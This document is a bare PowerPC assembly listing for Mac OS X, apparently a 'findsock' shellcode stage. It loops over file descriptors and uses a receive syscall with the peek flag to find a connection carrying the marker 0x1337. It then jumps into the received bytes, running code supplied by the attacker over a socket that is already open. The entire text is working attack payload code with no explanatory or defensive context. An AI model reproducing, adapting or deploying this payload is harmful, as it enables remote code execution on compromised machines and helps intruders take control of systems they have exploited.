.globl _main
.text
_main:
	li 	r29, 4096
	mtctr 	r29

findsock:
	li	r0, 102
	mfctr	r3
	subi	r4, r1, 8192
	li 	r5, 8192
	li	r6, 2
	sc
	b	next
	
	lwz	r28, -8192(r1)
	cmpwi	r28, 0x1337
	btl	eq, gotsock
	xor	r5, r5, r5
next:
	bdnz-	findsock

gotsock:
	addi	r28, r1, -8188
	mfctr	r30
	mtlr	r28
	blr
